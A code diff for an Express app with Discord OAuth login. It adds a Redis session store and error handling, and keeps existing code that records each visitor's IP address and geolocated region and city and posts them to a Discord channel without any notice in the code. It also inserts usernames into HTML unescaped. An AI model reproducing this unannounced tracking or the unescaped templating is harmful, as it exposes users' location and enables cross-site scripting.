@@ -2,6 +2,8 @@ import express from "express";
 import fetch from "node-fetch";
 import geoip from "geoip-lite";
 import session from "express-session";
+import connectRedis from "connect-redis";
+import Redis from "ioredis";
 import { sendDiscordInfo } from "./discordBot.js";
 import path from "path";
 import { fileURLToPath } from "url";
@@ -16,11 +18,16 @@ const __dirname = path.dirname(__filename);
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// セッション設定
+// Redis セッションストア設定
+const RedisStore = connectRedis(session);
+const redisClient = new Redis(process.env.REDIS_URL);
+
 app.use(session({
-  secret: process.env.SESSION_SECRET || "default_secret",
+  store: new RedisStore({ client: redisClient }),
+  secret: process.env.SESSION_SECRET,
   resave: false,
-  saveUninitialized: true
+  saveUninitialized: false,
+  cookie: { secure: false } // HTTPSなら true
 }));
 
 // Discord OAuth2 設定
@@ -29,7 +36,7 @@ const CLIENT_SECRET = process.env.CLIENT_SECRET;
 const REDIRECT_URI = process.env.REDIRECT_URI;
 const OAUTH_SCOPE = "identify email";
 
-// トップページアクセス → /login にリダイレクト
+// トップページ → /login にリダイレクト
 app.get("/", (req, res) => {
   res.redirect("/login");
 });
@@ -46,7 +53,6 @@ app.get("/callback", async (req, res) => {
   if (!code) return res.status(400).send("Code not provided");
 
   try {
-    // アクセストークン取得
     const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -59,15 +65,15 @@ app.get("/callback", async (req, res) => {
         scope: OAUTH_SCOPE
       })
     });
-    const tokenData = await tokenRes.json();
 
-    // ユーザー情報取得
+    const tokenData = await tokenRes.json();
+    if (!tokenData.access_token) throw new Error("No access token returned");
+
     const userRes = await fetch("https://discord.com/api/users/@me", {
       headers: { Authorization: `Bearer ${tokenData.access_token}` }
     });
     const userData = await userRes.json();
 
-    // IPと地域情報取得
     const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() || req.connection.remoteAddress;
     const geo = geoip.lookup(ip) || {};
 
@@ -77,15 +83,14 @@ app.get("/callback", async (req, res) => {
 IP: ${ip}
 地域: ${geo.region || "不明"} / ${geo.city || "不明"}`;
 
-    await sendDiscordInfo(message);
+    try { await sendDiscordInfo(message); } catch (err) { console.error("Discord通知失敗:", err); }
 
-    // セッションに保存
     req.session.user = { username: userData.username, discriminator: userData.discriminator };
     res.redirect("/welcome");
 
   } catch (err) {
-    console.error(err);
-    res.status(500).send("Error during authentication");
+    console.error("OAuth処理中エラー:", err);
+    res.status(500).send("認証中にエラーが発生しました");
   }
 });
 
@@ -94,11 +99,16 @@ app.get("/welcome", (req, res) => {
   const user = req.session.user;
   if (!user) return res.redirect("/login");
 
-  let html = fs.readFileSync(path.join(__dirname, "public", "welcome.html"), "utf-8");
-  html = html.replaceAll("{{ username }}", user.username)
-             .replaceAll("{{ discriminator }}", user.discriminator);
-
-  res.send(html);
+  let html;
+  try {
+    html = fs.readFileSync(path.join(__dirname, "public", "welcome.html"), "utf-8");
+    html = html.replaceAll("{{ username }}", user.username)
+               .replaceAll("{{ discriminator }}", user.discriminator);
+    res.send(html);
+  } catch (err) {
+    console.error("welcome.html 読み込みエラー:", err);
+    res.status(500).send("ウェルカムページ読み込み失敗");
+  }
 });
 
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
